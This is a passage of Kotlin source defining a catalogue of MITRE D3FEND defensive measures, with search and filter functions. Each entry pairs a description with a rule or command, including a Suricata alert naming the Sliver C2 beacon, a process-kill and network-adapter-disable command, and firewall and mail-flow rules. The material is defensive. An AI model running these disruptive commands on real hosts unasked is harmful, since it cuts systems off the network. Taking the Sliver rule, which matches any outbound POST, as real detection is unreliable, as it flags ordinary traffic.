            ruleOrFix = "alert http \$HOME_NET any -> \$EXTERNAL_NET any (msg:'Sliver C2 HTTP Beacon Detected'; content:'POST'; http_method; sid:1000021;)",
            counteredAttackIds = listOf("T1595.002", "T1071.001", "T1567.002"),
            tags = listOf("Detect", "NTA", "Suricata", "WAF", "TLS")
        ),
        MitreD3fendItem(
            d3fendId = "D3-UBA",
            name = "User Behavior Analytics & Mail Flow Monitoring",
            tactic = MitreDefendTactic.DETECT,
            description = "Detect anomalous user activities such as high-volume file downloads, mailbox auto-forwarding rule creation, and out-of-hours admin logins.",
            ruleOrFix = "Set-HostedOutboundSpamFilterPolicy -Identity Default -AutoForwardingMode Disable",
            counteredAttackIds = listOf("T1114.002"),
            tags = listOf("Detect", "UEBA", "Mail Flow", "M365")
        ),

        // ==================== 4. ISOLATE ====================
        MitreD3fendItem(
            d3fendId = "D3-EBR",
            name = "Executable Behavior Restriction & Sandboxing",
            tactic = MitreDefendTactic.ISOLATE,
            description = "Isolate email attachment execution within containerized sandboxes and restrict child process creation from Office documents.",
            ruleOrFix = "New-TransportRule -Name 'Block Dangerous Attachments' -AttachmentHasExecutableContent ${'$'}true -BlockMessage ${'$'}true",
            counteredAttackIds = listOf("T1566.001"),
            tags = listOf("Isolate", "Sandbox", "Attachment", "Container")
        ),
        MitreD3fendItem(
            d3fendId = "D3-DNSI",
            name = "Dynamic Network Segment Isolation",
            tactic = MitreDefendTactic.ISOLATE,
            description = "Enforce Zero Trust microsegmentation to block lateral movement across workstations, isolating lateral ports (RDP 3389, SMB 445, WinRM 5985).",
            ruleOrFix = "New-NetFirewallRule -Name 'Restrict-RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.100.0/24 -Action Allow",
            counteredAttackIds = listOf("T1021.001"),
            tags = listOf("Isolate", "Microsegmentation", "Firewall", "Zero Trust")
        ),

        // ==================== 5. DECEIVE ====================
        MitreD3fendItem(
            d3fendId = "D3-DE",
            name = "Decoy Environment & Honeytoken Accounts",
            tactic = MitreDefendTactic.DECEIVE,
            description = "Deploy bait Active Directory accounts, honey-hashes, and fake administrative credentials to trigger immediate high-confidence alerts upon adversary discovery.",
            ruleOrFix = "event.code: 4662 and object.type: 'user' and user.name: 'HoneyUserAdmin'",
            counteredAttackIds = listOf("T1087.002"),
            tags = listOf("Deceive", "Honeypot", "Honeytoken", "Active Directory")
        ),

        // ==================== 6. EVICT ====================
        MitreD3fendItem(
            d3fendId = "D3-PT",
            name = "Process Termination & Automated EDR Quarantining",
            tactic = MitreDefendTactic.EVICT,
            description = "Automate immediate process termination, host network isolation, and session revocation upon detection of ransomware or malicious service tampering.",
            ruleOrFix = "Stop-Process -Name 'ransom_payload' -Force; Set-NetAdapter -Name 'Ethernet' -Status Disabled",
            counteredAttackIds = listOf("T1489"),
            tags = listOf("Evict", "Process Kill", "EDR", "Quarantine")
        ),
        MitreD3fendItem(
            d3fendId = "D3-IRP",
            name = "Immutable Remote Backups & Ransomware Eviction",
            tactic = MitreDefendTactic.EVICT,
            description = "Maintain air-gapped, write-once-read-many (WORM) backups and trigger automatic system recovery upon ransomware encryption alerts.",
            ruleOrFix = "aws s3api put-object-lock-configuration --bucket CorpBackups --object-lock-configuration 'ObjectLockEnabled=Enabled'",
            counteredAttackIds = listOf("T1486"),
            tags = listOf("Evict", "Immutable Backup", "WORM", "Ransomware")
        )
    )

    fun filterTtps(
        query: String = "",
        selectedTactic: MitreTactic? = null
    ): List<MitreTtpItem> {
        val q = query.trim().lowercase()
        return allTtps.filter { ttp ->
            val matchesQuery = q.isEmpty() ||
                    ttp.techniqueId.lowercase().contains(q) ||
                    ttp.name.lowercase().contains(q) ||
                    ttp.d3fendId.lowercase().contains(q) ||
                    ttp.d3fendName.lowercase().contains(q) ||
                    ttp.description.lowercase().contains(q) ||
                    ttp.knownAptGroups.any { it.lowercase().contains(q) } ||
                    ttp.tags.any { it.lowercase().contains(q) }

            val matchesTactic = selectedTactic == null || ttp.tactic == selectedTactic

            matchesQuery && matchesTactic
        }
    }

    fun filterD3fendTtps(
        query: String = "",
        selectedDefendTactic: MitreDefendTactic? = null
    ): List<MitreD3fendItem> {
        val q = query.trim().lowercase()
        return allD3fendItems.filter { d3 ->
            val matchesQuery = q.isEmpty() ||
                    d3.d3fendId.lowercase().contains(q) ||
                    d3.name.lowercase().contains(q) ||
                    d3.description.lowercase().contains(q) ||
                    d3.counteredAttackIds.any { it.lowercase().contains(q) } ||
                    d3.tags.any { it.lowercase().contains(q) }

            val matchesTactic = selectedDefendTactic == null || d3.tactic == selectedDefendTactic

            matchesQuery && matchesTactic
        }
    }
}
